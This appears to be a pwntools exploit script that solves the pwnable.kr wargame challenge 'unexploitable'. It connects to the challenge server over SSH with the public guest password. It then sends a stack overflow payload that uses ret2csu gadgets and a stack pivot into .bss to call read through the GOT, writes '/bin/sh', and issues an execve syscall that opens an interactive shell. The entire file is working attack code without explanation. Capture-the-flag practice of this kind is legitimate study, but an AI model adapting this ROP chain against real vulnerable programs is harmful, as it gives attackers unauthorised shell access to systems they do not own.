from pwn import *

context.log_level = 'debug'

#s = process("./unexploitable")
ssh = ssh(user='unexploitable',host='pwnable.kr',port=2222,password='guest')
s = ssh.process("/home/unexploitable/unexploitable")
e = ELF("./unexploitable")
libc = e.libc

call_csu = 0x4005D0 
set_csu = 0x4005E6 

bss = e.bss()
sh_addr = bss + 0x300
fake_stack = bss + 16

binsh = "/bin/sh"+"\x00"*8

syscall = 0x0000000000400560
leave_ret = 0x0000000000400576
pop_rbp = 0x0000000000400512

pay = "A"*24

pay += p64(set_csu)
pay += "B"*8
pay += p64(0)
pay += p64(1)
pay += p64(e.got['read'])
pay += p64(0)
pay += p64(fake_stack)
pay += p64(0x400)

pay += p64(call_csu)
pay += "C"*8
pay += p64(0)
pay += p64(bss+8)
pay += p64(0)*4
pay += p64(leave_ret)

sleep(3)
s.send(pay)

pay2 = p64(set_csu)
pay2 += "D"*8
pay2 += p64(0)
pay2 += p64(1)
pay2 += p64(e.got['read'])
pay2 += p64(0)
pay2 += p64(sh_addr)
pay2 += p64(len(binsh))

pay2 += p64(call_csu)
pay2 += "C"*8
pay2 += p64(0)*6

pay2 += p64(syscall)
pay2 += "A"*104
pay2 += p64(sh_addr)
pay2 += p64(0)*4
pay2 += p64(59)
pay2 += p64(0)*2
pay2 += p64(syscall)
pay2 += p64(0)
pay2 += p64(0x33)
pay2 += "A"*32
pay2 += p64(0)

sleep(0.1)
s.send(pay2)
s.send(binsh)

s.interactive()
